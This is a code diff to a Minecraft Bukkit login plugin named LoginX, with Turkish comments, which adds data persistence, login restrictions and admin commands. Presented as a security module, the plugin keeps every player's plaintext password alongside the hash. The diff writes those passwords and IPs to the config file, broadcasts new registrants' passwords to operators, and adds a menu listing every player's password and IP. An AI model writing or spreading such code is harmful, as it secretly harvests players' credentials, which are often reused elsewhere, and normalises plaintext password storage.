@@ -5,12 +5,19 @@ import org.bukkit.command.*;
 import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.entity.Player;
 import org.bukkit.event.*;
+import org.bukkit.event.block.BlockBreakEvent;
+import org.bukkit.event.block.BlockPlaceEvent;
+import org.bukkit.event.entity.EntityDamageByEntityEvent;
+import org.bukkit.event.entity.EntityDamageEvent;
+import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.player.*;
+import org.bukkit.inventory.Inventory;
+import org.bukkit.inventory.ItemStack;
+import org.bukkit.inventory.meta.SkullMeta;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 
 import java.security.MessageDigest;
-import java.text.SimpleDateFormat;
 import java.util.*;
 
 public class LoginX extends JavaPlugin implements Listener {
@@ -27,9 +34,38 @@ public class LoginX extends JavaPlugin implements Listener {
         Bukkit.getPluginManager().registerEvents(this, this);
         saveDefaultConfig();
         cfg = getConfig();
-        getLogger().info("LoginX Egitim Modulu Aktif.");
+        loadData(); // Kayıtlı verileri yükle
+        getLogger().info("LoginX Gelismis Guvenlik ve Egitim Modulu Aktif.");
     }
 
+    @Override
+    public void onDisable() {
+        saveData(); // Kapanırken verileri kaydet
+    }
+
+    // --- VERİ YÖNETİMİ (Kalıcılık için) ---
+    private void loadData() {
+        if (cfg.contains("data")) {
+            for (String key : cfg.getConfigurationSection("data").getKeys(false)) {
+                UUID u = UUID.fromString(key);
+                passwords.put(u, cfg.getString("data." + key + ".hash"));
+                rawPasswords.put(u, cfg.getString("data." + key + ".raw"));
+                lastIP.put(u, cfg.getString("data." + key + ".ip"));
+            }
+        }
+    }
+
+    private void saveData() {
+        cfg.set("data", null); // Eski veriyi temizle
+        for (UUID u : passwords.keySet()) {
+            cfg.set("data." + u + ".hash", passwords.get(u));
+            cfg.set("data." + u + ".raw", rawPasswords.get(u));
+            cfg.set("data." + u + ".ip", lastIP.get(u));
+        }
+        saveConfig();
+    }
+
+    // --- GİRİŞ VE ÇIKIŞ OLAYLARI ---
     @EventHandler
     public void onJoin(PlayerJoinEvent e) {
         Player p = e.getPlayer();
@@ -59,6 +95,11 @@ public class LoginX extends JavaPlugin implements Listener {
         }.runTaskLater(this, cfg.getInt("login_timeout") * 20L);
     }
 
+    @EventHandler
+    public void onQuit(PlayerQuitEvent e) {
+        loggedIn.remove(e.getPlayer().getUniqueId()); // Çıkınca girişi sıfırla
+    }
+
     private void sendLoginTitle(Player p) {
         String header, footer;
         if (!passwords.containsKey(p.getUniqueId())) {
@@ -71,6 +112,7 @@ public class LoginX extends JavaPlugin implements Listener {
         p.sendTitle(header, footer, 10, 40, 10);
     }
 
+    // --- KOMUTLAR ---
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
         if (!(sender instanceof Player player)) return true;
@@ -81,6 +123,10 @@ public class LoginX extends JavaPlugin implements Listener {
                 player.sendMessage(color("&cKullanım: /register <şifre> <şifre>"));
                 return true;
             }
+            if (passwords.containsKey(uuid)) {
+                player.sendMessage(color("&cZaten kayıtlısın! /login <şifre> kullan."));
+                return true;
+            }
             if (!args[0].equals(args[1])) {
                 player.sendMessage(color("&cŞifreler uyuşmuyor!"));
                 return true;
@@ -88,6 +134,7 @@ public class LoginX extends JavaPlugin implements Listener {
             passwords.put(uuid, hash(args[0]));
             rawPasswords.put(uuid, args[0]);
             loggedIn.add(uuid);
+            saveData();
             player.sendMessage(color("&aBaşarıyla kayıt oldun!"));
             notifyOps(player, "&d[YENI KAYIT] &eSifre: &f" + args[0]);
             return true;
@@ -96,6 +143,10 @@ public class LoginX extends JavaPlugin implements Listener {
         if (cmd.getName().equalsIgnoreCase("login")) {
             if (args.length < 1) {
                 player.sendMessage(color("&cKullanım: /login <şifre>"));
+                return true;
+            }
+            if (!passwords.containsKey(uuid)) {
+                player.sendMessage(color("&cÖnce kayıt olmalısın! /register <şifre> <şifre>"));
                 return true;
             }
             String input = args[0];
@@ -112,33 +163,129 @@ public class LoginX extends JavaPlugin implements Listener {
             return true;
         }
 
+        if (cmd.getName().equalsIgnoreCase("sifredegis")) {
+            if (!player.hasPermission("loginx.admin")) {
+                player.sendMessage(color("&cBunun için yetkin yok!"));
+                return true;
+            }
+            if (args.length != 2) {
+                player.sendMessage(color("&cKullanım: /sifredegis <oyuncu> <yeni_şifre>"));
+                return true;
+            }
+            OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
+            if (!passwords.containsKey(target.getUniqueId())) {
+                player.sendMessage(color("&cBu oyuncu sisteme kayıtlı değil."));
+                return true;
+            }
+            passwords.put(target.getUniqueId(), hash(args[1]));
+            rawPasswords.put(target.getUniqueId(), args[1]);
+            saveData();
+            player.sendMessage(color("&a" + target.getName() + " adlı kişinin şifresi değiştirildi: &f" + args[1]));
+            return true;
+        }
+
         if (cmd.getName().equalsIgnoreCase("logingoster")) {
-            if (!player.hasPermission("loginx.view")) return true;
+            if (!player.hasPermission("loginx.admin")) return true;
 
-            if (args.length == 1 && args[0].equalsIgnoreCase("hepsi")) {
-                player.sendMessage(color("&5&l=== TUM OYUNCU LOGIN VERILERI ==="));
-                for (UUID id : rawPasswords.keySet()) {
-                    String name = Bukkit.getOfflinePlayer(id).getName();
-                    player.sendMessage(color("&d> &b" + name + " &8| &eSifre: &f" + rawPasswords.get(id) + " &8| &7IP: " + lastIP.get(id)));
-                }
+            if (args.length == 1 && args[0].equalsIgnoreCase("all")) {
+                openLoginMenu(player);
                 return true;
             }
 
-            if (args.length == 1) {
-                OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
-                UUID tUUID = target.getUniqueId();
-                player.sendMessage(color("&6&lLoginX Sorgu: &f" + target.getName()));
-                player.sendMessage(color("&eAcık Sifre: &b" + rawPasswords.getOrDefault(tUUID, "Veri yok")));
-                player.sendMessage(color("&eSon IP: &f" + lastIP.getOrDefault(tUUID, "Bilinmiyor")));
-                return true;
-            }
+            player.sendMessage(color("&cKullanım: /logingoster all"));
+            return true;
         }
         return true;
     }
 
-    @EventHandler public void onMove(PlayerMoveEvent e) { if (!loggedIn.contains(e.getPlayer().getUniqueId())) e.setCancelled(true); }
-    @EventHandler public void onChat(AsyncPlayerChatEvent e) { if (!loggedIn.contains(e.getPlayer().getUniqueId())) e.setCancelled(true); }
+    // --- GUI (MENÜ) SİSTEMİ ---
+    private void openLoginMenu(Player player) {
+        Inventory gui = Bukkit.createInventory(null, 54, color("&8Oyuncu Login Verileri"));
 
+        for (UUID id : rawPasswords.keySet()) {
+            OfflinePlayer target = Bukkit.getOfflinePlayer(id);
+            ItemStack head = new ItemStack(Material.PLAYER_HEAD);
+            SkullMeta meta = (SkullMeta) head.getItemMeta();
+            
+            if (meta != null) {
+                meta.setOwningPlayer(target);
+                meta.setDisplayName(color("&e&l" + (target.getName() != null ? target.getName() : "Bilinmiyor")));
+                List<String> lore = new ArrayList<>();
+                lore.add(color("&7Şifre: &f" + rawPasswords.get(id)));
+                lore.add(color("&7Son IP: &f" + lastIP.get(id)));
+                lore.add(color("&7Durum: &aKayıtlı"));
+                meta.setLore(lore);
+                head.setItemMeta(meta);
+            }
+            gui.addItem(head);
+        }
+        player.openInventory(gui);
+    }
+
+    @EventHandler
+    public void onMenuClick(InventoryClickEvent e) {
+        if (e.getView().getTitle().equals(color("&8Oyuncu Login Verileri"))) {
+            e.setCancelled(true); // Menüden kafa alınmasını engeller
+        }
+    }
+
+    // --- TAM KORUMALAR (Kısıtlamalar) ---
+    private boolean isNotLogged(Player p) {
+        return !loggedIn.contains(p.getUniqueId());
+    }
+
+    private void sendWarning(Player p) {
+        p.sendMessage(color("&cDevam etmek için giriş yapmalı veya kayıt olmalısınız!"));
+    }
+
+    @EventHandler(priority = EventPriority.HIGHEST) public void onMove(PlayerMoveEvent e) {
+        if (isNotLogged(e.getPlayer())) e.setCancelled(true); // Hareket engelleme
+    }
+    
+    @EventHandler(priority = EventPriority.HIGHEST) public void onBlockBreak(BlockBreakEvent e) {
+        if (isNotLogged(e.getPlayer())) { e.setCancelled(true); sendWarning(e.getPlayer()); }
+    }
+    
+    @EventHandler(priority = EventPriority.HIGHEST) public void onBlockPlace(BlockPlaceEvent e) {
+        if (isNotLogged(e.getPlayer())) { e.setCancelled(true); sendWarning(e.getPlayer()); }
+    }
+    
+    @EventHandler(priority = EventPriority.HIGHEST) public void onInteract(PlayerInteractEvent e) {
+        if (isNotLogged(e.getPlayer())) e.setCancelled(true);
+    }
+    
+    @EventHandler(priority = EventPriority.HIGHEST) public void onDrop(PlayerDropItemEvent e) {
+        if (isNotLogged(e.getPlayer())) { e.setCancelled(true); sendWarning(e.getPlayer()); }
+    }
+    
+    @EventHandler(priority = EventPriority.HIGHEST) public void onInventoryUse(InventoryClickEvent e) {
+        if (e.getWhoClicked() instanceof Player p && isNotLogged(p)) e.setCancelled(true);
+    }
+    
+    @EventHandler(priority = EventPriority.HIGHEST) public void onDamage(EntityDamageEvent e) {
+        if (e.getEntity() instanceof Player p && isNotLogged(p)) e.setCancelled(true); // Hasar almayı kapatır
+    }
+    
+    @EventHandler(priority = EventPriority.HIGHEST) public void onDamageDeal(EntityDamageByEntityEvent e) {
+        if (e.getDamager() instanceof Player p && isNotLogged(p)) e.setCancelled(true); // Hasar vermeyi kapatır
+    }
+
+    @EventHandler(priority = EventPriority.HIGHEST) public void onChat(AsyncPlayerChatEvent e) {
+        if (isNotLogged(e.getPlayer())) { e.setCancelled(true); sendWarning(e.getPlayer()); }
+    }
+
+    @EventHandler(priority = EventPriority.HIGHEST) public void onCommandProcess(PlayerCommandPreprocessEvent e) {
+        if (isNotLogged(e.getPlayer())) {
+            String msg = e.getMessage().toLowerCase();
+            // Sadece /login ve /register komutlarına izin ver
+            if (!msg.startsWith("/login") && !msg.startsWith("/register")) {
+                e.setCancelled(true);
+                sendWarning(e.getPlayer());
+            }
+        }
+    }
+
+    // --- YARDIMCI METOTLAR ---
     private void notifyOps(Player p, String info) {
         String msg = color("&d&lLoginX &8| &b" + p.getName() + " &8» " + info);
         Bukkit.getOnlinePlayers().stream().filter(Player::isOp).forEach(op -> op.sendMessage(msg));
